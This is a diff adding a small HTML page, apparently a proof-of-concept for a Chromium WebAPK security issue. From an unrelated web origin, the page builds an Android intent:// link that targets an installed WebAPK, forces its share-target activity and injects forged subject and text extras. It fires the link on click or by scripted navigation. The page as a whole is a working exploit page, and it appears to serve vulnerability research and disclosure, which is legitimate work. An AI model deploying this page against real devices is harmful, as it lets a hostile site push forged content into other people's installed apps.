@@ -1,0 +1,30 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WebAPK intent carrier</title>
+<style>
+  body { font: 18px system-ui, sans-serif; max-width: 46rem; margin: 3rem auto; padding: 0 1rem; }
+  a, button { display: block; margin: 1rem 0; padding: 1rem; font-size: 1rem; }
+  pre { white-space: pre-wrap; overflow-wrap: anywhere; background: #eee; padding: 1rem; }
+</style>
+<h1>WebAPK intent carrier</h1>
+<p>This page is an unrelated HTTPS origin. It constructs an Android intent only from the supplied controlled victim host and installed WebAPK package.</p>
+<a id="trigger">Launch forged ACTION_VIEW intent</a>
+<button id="scripted" type="button">Attempt scripted navigation after two seconds</button>
+<pre id="state">LOADING</pre>
+<script>
+  const params = new URLSearchParams(location.search);
+  const victim = params.get('victim') || '';
+  const packageName = params.get('package') || '';
+  const shareClass = 'org.chromium.webapk.shell_apk.ShareActivity0';
+  const selectedExtra = 'org.chromium.webapk.selected_share_target_activity_class_name';
+  const intent = `intent://${victim}/in-scope#Intent;scheme=https;action=android.intent.action.VIEW;package=${packageName};S.${selectedExtra}=${shareClass};S.android.intent.extra.SUBJECT=forged-title;S.android.intent.extra.TEXT=FORGED_SHARE_BODY_7f31;end`;
+  const trigger = document.querySelector('#trigger');
+  const state = document.querySelector('#state');
+  trigger.href = intent;
+  state.textContent = `victim=${victim}\npackage=${packageName}\n${intent}`;
+  document.querySelector('#scripted').addEventListener('click', () => {
+    state.textContent += '\nSCRIPTED_NAVIGATION_ARMED';
+    setTimeout(() => { location.href = intent; }, 2000);
+  });
+</script>
